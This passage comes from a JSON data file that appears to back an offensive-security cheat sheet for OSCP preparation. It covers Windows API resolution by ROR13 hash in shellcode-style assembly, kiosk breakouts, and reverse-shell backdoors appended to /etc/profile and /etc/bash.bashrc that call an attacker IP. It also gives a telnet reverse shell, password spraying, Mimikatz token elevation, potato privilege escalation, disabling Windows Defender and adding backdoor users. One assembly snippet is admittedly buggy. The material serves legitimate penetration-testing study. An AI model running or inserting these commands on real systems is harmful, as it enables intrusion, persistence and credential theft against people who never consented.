            "lang": "text",
            "code": "DOS Header -> PE Header -> Optional Header -> Data Directories\nData Directory[0] = Export Directory RVA and Size"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "DLLs export functions through the Export Directory."
          }
        ]
      },
      {
        "title": "Export Directory Structure [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "Offset  Field\n0x00    Characteristics\n0x04    TimeDateStamp\n0x0C    Name (RVA to DLL name)\n0x14    Base (ordinal base)\n0x18    NumberOfFunctions\n0x1C    NumberOfNames\n0x20    AddressOfFunctions (RVA to function address array)\n0x24    AddressOfNames (RVA to function name array)\n0x28    AddressOfNameOrdinals (RVA to ordinal array)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Key fields in IMAGE_EXPORT_DIRECTORY."
          }
        ]
      },
      {
        "title": "PE Header Navigation [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "DllBase + 0x3C = e_lfanew (offset to PE signature)\nDllBase + e_lfanew = PE Signature (\"PE\\0\\0\")\nPE + 0x78 = Export Directory RVA (in Optional Header Data Directories)\nDllBase + ExportDirRVA = Export Directory"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Navigate from DLL base to Export Directory."
          }
        ]
      },
      {
        "title": "Find Export Directory Assembly",
        "codes": [
          {
            "lang": "nasm",
            "code": "; Assume EBX = kernel32.dll base address\nfind_export_dir:\n    mov eax, [ebx + 0x3c]       ; EAX = e_lfanew\n    mov eax, [ebx + eax + 0x78] ; EAX = Export Directory RVA\n    add eax, ebx                ; EAX = Export Directory VA\n    ; EAX now points to IMAGE_EXPORT_DIRECTORY"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Locate the Export Directory from DLL base."
          }
        ]
      },
      {
        "title": "Function Name Hashing [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Compare hashes instead of full strings to save space:\n- **Why hash?**: String comparisons require storing full function names\n- **Hash algorithm**: Simple rotate-and-add produces unique 32-bit hash\n- Pre-compute hashes for target functions",
            "variant": "info"
          }
        ]
      },
      {
        "title": "ROR13 Hash Algorithm",
        "codes": [
          {
            "lang": "python",
            "code": "def ror13_hash(name):\n    \"\"\"Compute ROR13 hash of a string\"\"\"\n    hash_value = 0\n    for char in name:\n        hash_value = ((hash_value >> 13) | (hash_value << 19)) & 0xFFFFFFFF\n        hash_value = (hash_value + ord(char)) & 0xFFFFFFFF\n    return hash_value\n\n# Example hashes\nprint(f\"GetProcAddress: {hex(ror13_hash('GetProcAddress'))}\")\nprint(f\"LoadLibraryA: {hex(ror13_hash('LoadLibraryA'))}\")\nprint(f\"CreateProcessA: {hex(ror13_hash('CreateProcessA'))}\")"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Common **ROR13** hashing algorithm for function names."
          }
        ]
      },
      {
        "title": "Common Function Hashes",
        "codes": [
          {
            "lang": "python",
            "code": "# kernel32.dll functions\nHASH_GetProcAddress  = 0x7c0dfcaa\nHASH_LoadLibraryA    = 0xec0e4e8e\nHASH_CreateProcessA  = 0x16b3fe72\nHASH_ExitProcess     = 0x73e2d87e\nHASH_WinExec         = 0x0e8afe98\n\n# ws2_32.dll functions\nHASH_WSAStartup      = 0x3bfcedcb\nHASH_WSASocketA      = 0xadf509d9\nHASH_connect         = 0x60aaf9ec"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Pre-computed ROR13 hashes for common functions."
          }
        ]
      },
      {
        "title": "Find Function by Hash Assembly",
        "codes": [
          {
            "lang": "nasm",
            "code": "; Input: EBX = DLL base, EDX = target hash\n; Output: EAX = function address\n\nfind_function:\n    pushad\n    mov eax, [ebx + 0x3c]           ; e_lfanew\n    mov eax, [ebx + eax + 0x78]     ; Export Directory RVA\n    add eax, ebx                    ; Export Directory VA\n    mov ecx, [eax + 0x18]           ; NumberOfNames\n    mov edi, [eax + 0x20]           ; AddressOfNames RVA\n    add edi, ebx                    ; AddressOfNames VA\n\nfind_function_loop:\n    dec ecx                         ; Decrement counter\n    js find_function_fail           ; If negative, not found\n    mov esi, [edi + ecx * 4]        ; Get name RVA\n    add esi, ebx                    ; Name VA\n\ncompute_hash:\n    xor eax, eax                    ; Clear hash\n    cld                             ; Clear direction flag\ncompute_hash_loop:\n    lodsb                           ; Load byte from name\n    test al, al                     ; Check for NULL terminator\n    jz compute_hash_done\n    ror eax, 13                     ; Rotate right 13 bits\n    add eax, edx                    ; Add to hash (note: should add char, fix below)\n    jmp compute_hash_loop\n\n; ... continue with comparison and address lookup"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Search export table for function matching hash."
          }
        ]
      },
      {
        "title": "Complete Function Resolution",
        "codes": [
          {
            "lang": "nasm",
            "code": "; Assumes: EBP = kernel32 base, ESI = function hash\nfind_function:\n    pushad\n    mov eax, [ebp + 0x3c]           ; PE header offset\n    mov edx, [ebp + eax + 0x78]     ; Export table RVA\n    add edx, ebp                    ; Export table VA\n    mov ecx, [edx + 0x18]           ; Number of names\n    mov ebx, [edx + 0x20]           ; Names table RVA\n    add ebx, ebp                    ; Names table VA\n\nfind_loop:\n    jecxz find_done                 ; Exit if counter = 0\n    dec ecx                         ; Decrement counter\n    mov edi, [ebx + ecx * 4]        ; Name RVA\n    add edi, ebp                    ; Name VA\n    xor eax, eax                    ; Zero hash accumulator\n    cdq                             ; Zero EDX\n\nhash_loop:\n    lodsb                           ; Load next char\n    ror edx, 13                     ; Rotate hash\n    add edx, eax                    ; Add char to hash\n    cmp al, 0                       ; End of string?\n    jne hash_loop\n\n    cmp edx, esi                    ; Compare with target hash\n    jnz find_loop                   ; If not match, continue\n\n    ; Found! Get function address\n    mov ebx, [edx + 0x24]           ; Ordinals table RVA\n    add ebx, ebp                    ; Ordinals table VA\n    mov cx, [ebx + ecx * 2]         ; Get ordinal\n    mov ebx, [edx + 0x1c]           ; Functions table RVA\n    add ebx, ebp                    ; Functions table VA\n    mov eax, [ebx + ecx * 4]        ; Function RVA\n    add eax, ebp                    ; Function VA\n    mov [esp + 0x1c], eax           ; Store in saved EAX\n\nfind_done:\n    popad\n    ret"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Full assembly to find function by hash."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "PE Format Documentation",
        "url": "https://learn.microsoft.com/en-us/windows/win32/debug/pe-format"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Locate function addresses in DLLs by parsing the Export Directory Table."
      }
    ]
  },
  {
    "category": "Linux Kiosk Breakout",
    "title": "System Information via Browser",
    "tags": [
      "Defense_Evasion",
      "Linux",
      "Mobile",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Proc Filesystem",
        "codes": [
          {
            "lang": "text",
            "code": "file:///proc/version\nfile:///proc/cpuinfo\nfile:///proc/self/cmdline\nfile:///proc/self/environ\nfile:///proc/self/cwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Network Information",
        "codes": [
          {
            "lang": "text",
            "code": "file:///etc/hosts\nfile:///etc/resolv.conf\nfile:///proc/net/tcp"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Enumeration",
    "title": "System Updates with APT",
    "tags": [
      "Discovery",
      "Enumeration",
      "Linux"
    ],
    "steps": [
      {
        "title": "Update Package Lists",
        "codes": [
          {
            "lang": "bash",
            "code": "# Updates repositories and available packages\napt-get update"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Upgrade Packages",
        "codes": [
          {
            "lang": "bash",
            "code": "# Install newer versions of packages if available\napt-get upgrade"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Distribution Upgrade",
        "codes": [
          {
            "lang": "bash",
            "code": "# Intelligently updates system, updating dependencies and removing obsolete packages\napt-get dist-upgrade"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Config File Backdoors",
    "title": "System-Wide Backdoors (Requires Root)",
    "tags": [
      "Exploitation",
      "Linux",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "/etc/profile Backdoor",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> /etc/profile"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "/etc/bash.bashrc Backdoor",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> /etc/bash.bashrc"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Persistence",
    "title": "System-Wide Persistence (Requires Root)",
    "tags": [
      "Linux",
      "Persistence"
    ],
    "steps": [
      {
        "title": "/etc/profile Backdoor",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> /etc/profile"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "/etc/bash.bashrc Backdoor",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> /etc/bash.bashrc"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Windows Kiosk Breakout",
    "title": "Task Manager Escape",
    "tags": [
      "Defense_Evasion",
      "Mobile",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "If Task Manager Accessible",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Task Manager escape:\n1. File, Run new task\n2. Type cmd.exe\n3. Check \"Create this task with administrative privileges\"",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Reverse Shells",
    "title": "Telnet Reverse Shell",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Requires two listeners: one for input, one for output."
      },
      {
        "type": "text",
        "content": "```bash\ntelnet <AttackerIP> <Port> | /bin/bash | telnet <AttackerIP> <Port2>\n```"
      }
    ]
  },
  {
    "category": "Password Strategy",
    "title": "Testing Philosophy",
    "tags": [],
    "steps": [
      {
        "title": "Priority Order",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "1. **Default Credentials** (30 seconds - 2 minutes)\n2. **Username as Password** (30 seconds)\n3. **Credential Reuse** (1 minute)\n4. **Password Spraying** (5-10 minutes)\n5. **Targeted Wordlist** (10-30 minutes)\n6. **Rockyou.txt** (30 minutes - hours)\n7. **Custom Wordlist Generation** (if needed)\n8. **Brute Force** (last resort)"
          }
        ]
      }
    ],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "**Golden Rule**: Always try the easiest attacks first before moving to time-consuming brute-forcing.",
        "variant": "important"
      }
    ]
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Testing Stabilization",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```bash\n# Test tab completion\ncd /et[TAB]\n# Should complete to /etc/"
      },
      {
        "type": "text",
        "content": "# Test arrow keys\n# Press up arrow\n# Should show previous command"
      },
      {
        "type": "text",
        "content": "# Test Ctrl+C\nping 8.8.8.8\n# Press Ctrl+C\n# Should stop ping, not kill shell"
      },
      {
        "type": "text",
        "content": "# Test vim\nvim test.txt\n# Should open vim properly\n```"
      }
    ]
  },
  {
    "category": "Default Credentials",
    "title": "Testing Strategy",
    "tags": [],
    "steps": [
      {
        "title": "Step 1: Try Username:Username",
        "codes": [
          {
            "lang": "bash",
            "code": "# Example with SSH\nssh admin@<TargetIP>\n# Password: admin\n\n# Example with SMB\ncrackmapexec smb <TargetIP> -u admin -p admin"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 2: Try admin:admin",
        "codes": [
          {
            "lang": "bash",
            "code": "crackmapexec smb <TargetIP> -u admin -p admin\ncrackmapexec winrm <TargetIP> -u administrator -p administrator"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 3: Try Common Defaults",
        "codes": [
          {
            "lang": "bash",
            "code": "# Create password list\ncat > common_defaults.txt << EOF\npassword\npassword1\nPassword1\nadmin\nadministrator\nwelcome\nWelcome1\nP@ssw0rd\nEOF\n\n# Spray with CrackMapExec\ncrackmapexec smb <TargetIP> -u admin -p common_defaults.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 4: Service-Specific Defaults",
        "codes": [
          {
            "lang": "bash",
            "code": "# MySQL\nmysql -h <TargetIP> -u root -p\n# Password: root or blank\n\n# PostgreSQL\npsql -h <TargetIP> -U postgres\n# Password: postgres or blank\n\n# Tomcat\n# Username: tomcat, admin\n# Password: tomcat, admin, s3cret"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If you identify a specific service, try its default credentials.",
            "variant": "important"
          }
        ]
      }
    ],
    "resources": []
  },
  {
    "category": "OSCP Exam Strategy",
    "title": "Time Allocation",
    "tags": [
      "Exam",
      "OSCP",
      "Workflow"
    ],
    "steps": [
      {
        "title": "24-Hour Exam Timeline",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "**Hours 1-2: Initial Enumeration**\n- Scan all machines\n- Identify attack vectors\n- Prioritize targets"
          },
          {
            "type": "text",
            "content": "**Hours 3-8: First Machine**\n- Initial access\n- User privilege\n- Root privilege\n- Documentation"
          },
          {
            "type": "text",
            "content": "**Hours 9-14: Second Machine**\n- Repeat process\n- Full compromise\n- Documentation"
          },
          {
            "type": "text",
            "content": "**Hours 15-20: Third Machine**\n- Final standalone machine\n- Full compromise\n- Documentation"
          },
          {
            "type": "text",
            "content": "**Hours 21-24: AD Set or Buffer**\n- Attempt AD if needed\n- Review documentation\n- Verify all screenshots\n- Rest if you have enough points"
          },
          {
            "type": "note",
            "content": "If you have 70+ points by hour 15, take a break and review your documentation.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Password Strategy",
    "title": "Time Management",
    "tags": [],
    "steps": [
      {
        "title": "Quick Wins (0-5 minutes)",
        "codes": [
          {
            "lang": "plaintext",
            "code": "\u2713 Default credentials (2 min)\n\u2713 Username as password (1 min)\n\u2713 Credential reuse (2 min)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Medium Effort (5-30 minutes)",
        "codes": [
          {
            "lang": "plaintext",
            "code": "\u2713 Password spraying (10 min)\n\u2713 Common passwords (10 min)\n\u2713 Service-specific defaults (10 min)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "High Effort (30+ minutes)",
        "codes": [
          {
            "lang": "plaintext",
            "code": "\u2713 Rockyou.txt (30 min - hours)\n\u2713 Custom wordlist generation (varies)\n\u2713 Brute force (hours - days)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "OSCP Exam Strategy",
    "title": "Time Management",
    "tags": [
      "Exam",
      "OSCP",
      "Workflow"
    ],
    "steps": [
      {
        "title": "First Attempt Mistake",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "**Problem:** Switching between machines while waiting for tasks\n- Working on machine X while hash cracking on machine Y\n- Constantly context switching\n- Lost focus and momentum\n- **Result:** Failed exam after 24 hours"
          }
        ]
      },
      {
        "title": "Second Attempt Success",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "**Strategy:** Fully compromise each machine sequentially\n- Started at 7 AM\n- Rooted three individual machines by 1 PM (6 hours)\n- Accumulated 60 points + 10 bonus = 70 points (PASS)\n- Didn't need to compromise AD set"
          },
          {
            "type": "note",
            "content": "Complete each machine 100% before moving to the next one.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Focus on one machine at a time - don't switch between machines every 30 minutes.",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Mimikatz",
    "title": "Token Manipulation",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Elevate to SYSTEM",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # privilege::debug\nmimikatz # token::elevate"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Impersonates SYSTEM token for elevated operations.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "List Available Tokens",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # token::list"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Impersonate Specific Token",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # token::elevate /domainadmin"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Revert to Original Token",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # token::revert"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Token Impersonation - Potato Attacks",
    "title": "Tool Selection Guide",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Quick Reference",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "| Tool | Windows Version | Complexity | Success Rate | Notes |\n|------|----------------|------------|--------------|-------|\n| **GodPotato** | 8-11, Server 2012-2022 | Low | Very High | Try first on modern Windows |\n| **PrintSpoofer** | Server 2016-2022, Win10-11 | Low | High | Simple, reliable |\n| **JuicyPotatoNG** | Server 2012-2022, Win10-11 | Medium | High | Updated JuicyPotato |\n| **SweetPotato** | Multiple versions | Low | High | Auto-selects technique |\n| **RoguePotato** | Server 2016-2019, Win10 | High | Medium | Needs attacker machine |\n| **SharpEfsPotato** | Server 2016-2022, Win10-11 | Medium | High | Uses EFSRPC |\n| **JuicyPotato** | 7-10 pre-1809, Server 2008-2016 | High | Medium | Legacy only, needs CLSID |"
          }
        ]
      },
      {
        "title": "Recommended Try Order",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "1. **GodPotato** - Most reliable on modern systems\n2. **PrintSpoofer** - Simple and effective\n3. **JuicyPotatoNG** - Good fallback\n4. **SweetPotato** - Auto-selects best method\n5. **SharpEfsPotato** - Alternative approach\n6. **RoguePotato** - If you can set up listener\n7. **JuicyPotato** - Only for legacy systems"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "KeePass Password Manager",
    "title": "Troubleshooting",
    "tags": [],
    "steps": [
      {
        "title": "keepass2john Not Found",
        "codes": [
          {
            "lang": "bash",
            "code": "# Locate the script\nlocate keepass2john\n\n# Run directly\npython3 /usr/share/john/keepass2john.py Database.kdbx > keepass.hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Invalid Hash Format",
        "codes": [
          {
            "lang": "bash",
            "code": "# Remove filename from hash\nsed 's/^[^:]*://' keepass.hash > keepass_clean.hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Ensure the hash file only contains the hash, not the filename.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Hashcat Not Working on VM",
        "codes": [
          {
            "lang": "bash",
            "code": "# Use --force flag\nhashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "kpcli Can't Open Database",
        "codes": [
          {
            "lang": "bash",
            "code": "# Verify cracked password\njohn keepass.hash --show\n\n# Try opening with exact password\nkpcli --kdb=Database.kdbx"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Ensure you're using the correct master password.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": []
  },
  {
    "category": "Password Cracking",
    "title": "Troubleshooting",
    "tags": [
      "Credential_Access",
      "Hashcat",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Hash Format Issues",
        "codes": [
          {
            "lang": "bash",
            "code": "# Remove username prefix if present\ncat hashes.txt | cut -d: -f2 > clean_hashes.txt\n\n# John expects username:hash format\ncat hashes.txt | awk '{print \"user:\"$1}' > formatted.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Show Cracked Passwords",
        "substeps": [
          {
            "title": "Hashcat",
            "codes": [
              {
                "lang": "bash",
                "code": "hashcat -m 1000 ntlm.txt --show"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "John",
            "codes": [
              {
                "lang": "bash",
                "code": "john --show ntlm.txt"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Resume Interrupted Session",
        "substeps": [
          {
            "title": "Hashcat",
            "codes": [
              {
                "lang": "bash",
                "code": "hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt --restore"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "John",
            "codes": [
              {
                "lang": "bash",
                "code": "# John automatically resumes from ~/.john/john.rec\njohn --restore"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Clear Hashcat Potfile (Start Fresh)",
        "codes": [
          {
            "lang": "bash",
            "code": "rm ~/.hashcat/hashcat.potfile"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Clear John Potfile",
        "codes": [
          {
            "lang": "bash",
            "code": "rm ~/.john/john.pot"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "File Transfer Techniques",
    "title": "Troubleshooting",
    "tags": [],
    "steps": [
      {
        "title": "SMB Server Not Working",
        "codes": [
          {
            "lang": "bash",
            "code": "# Try without SMB2 support\nimpacket-smbserver share . \n\n# Try with authentication\nimpacket-smbserver share . -smb2support -username user -password pass"
          },
          {
            "lang": "bash",
            "code": "# On Windows - Connect with credentials\nnet use \\\\<KaliIP>\\share /user:user pass\ncopy file.txt \\\\<KaliIP>\\share\\"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "PowerShell Download Blocked",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Bypass execution policy\npowershell -ep bypass\n\n# Use different method\ncertutil -urlcache -split -f \"http://<KaliIP>/file.exe\" file.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Firewall Blocking",
        "codes": [
          {
            "lang": "bash",
            "code": "# Try different ports\npython3 -m http.server 8080\npython3 -m http.server 443"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "AV Blocking Downloads",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Disable Windows Defender (if admin)\nSet-MpPreference -DisableRealtimeMonitoring $true\n\n# Use obfuscation\n# Encode payload with base64"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Troubleshooting",
    "tags": [],
    "steps": [
      {
        "title": "Python Not Available",
        "codes": [
          {
            "lang": "bash",
            "code": "# Try python3\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n# Try script\nscript /dev/null -c bash\n\n# Try other methods (perl, ruby, etc.)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "stty Command Not Found",
        "codes": [
          {
            "lang": "bash",
            "code": "# Skip the stty step\n# Just use: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Then: export TERM=xterm"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Shell Becomes Unresponsive",
        "codes": [
          {
            "lang": "bash",
            "code": "# If shell freezes after stty raw -echo; fg\n# Just press Enter a few times\n# Type 'reset' and press Enter\n# Type 'export TERM=xterm' and press Enter"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Lost Shell After Ctrl+Z",
        "codes": [
          {
            "lang": "bash",
            "code": "# Bring it back to foreground\nfg\n\n# If that doesn't work, check jobs\njobs\n\n# Bring specific job to foreground\nfg %1"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "GitHub Reconnaissance",
    "title": "Troubleshooting",
    "tags": [],
    "steps": [
      {
        "title": ".git Directory Not Accessible",
        "codes": [
          {
            "lang": "bash",
            "code": "curl http://<TargetIP>/.git/HEAD\ncurl http://<TargetIP>/.git/config\ncurl http://<TargetIP>/.git/logs/HEAD"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Try different paths:",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "git-dumper Fails",
        "codes": [
          {
            "lang": "bash",
            "code": "# Try manual download\nwget -r -np -R \"index.html*\" http://<TargetIP>/.git/\n\n# Or use GitTools\n./GitTools/Dumper/gitdumper.sh http://<TargetIP>/.git/ ./output"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Repository Appears Empty",
        "codes": [
          {
            "lang": "bash",
            "code": "# Check all branches\ngit branch -a\n\n# Check reflog\ngit reflog\n\n# List all objects\ngit rev-list --all"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "User Management Commands",
    "title": "Troubleshooting",
    "tags": [],
    "steps": [
      {
        "title": "Windows - User Creation Fails",
        "codes": [
          {
            "lang": "bash",
            "code": "# Check if you have admin rights\nwhoami /priv\n\n# Try with full path\nC:\\Windows\\System32\\net.exe user hacker Password123! /add"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Windows - Password Policy Violation",
        "codes": [
          {
            "lang": "bash",
            "code": "# Use stronger password\nnet user hacker P@ssw0rd123! /add\n\n# Or disable password complexity (if admin)\nsecedit /export /cfg C:\\secpol.cfg\n# Edit PasswordComplexity = 0\nsecedit /configure /db C:\\Windows\\security\\local.sdb /cfg C:\\secpol.cfg"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Linux - Permission Denied",
        "codes": [
          {
            "lang": "bash",
            "code": "# Ensure you're root\nsudo -i\n\n# Or use sudo with commands\nsudo useradd -m hacker\nsudo passwd hacker"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Linux - User Already Exists",
        "codes": [
          {
            "lang": "bash",
            "code": "# Delete existing user first\nsudo userdel -r <username>\n\n# Then create new user\nsudo useradd -m <username>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Evil-WinRM",
    "title": "Troubleshooting",
    "tags": [],
    "steps": [
      {
        "title": "Connection Refused",
        "codes": [
          {
            "lang": "bash",
            "code": "# Check if WinRM is accessible\nnmap -p5985,5986 <TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Ensure WinRM service is running on target and ports 5985/5986 are open.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Authentication Failed",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Try different authentication methods:\n- Password authentication\n- Pass the hash\n- Domain authentication with `-d` flag",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "SSL Certificate Errors",
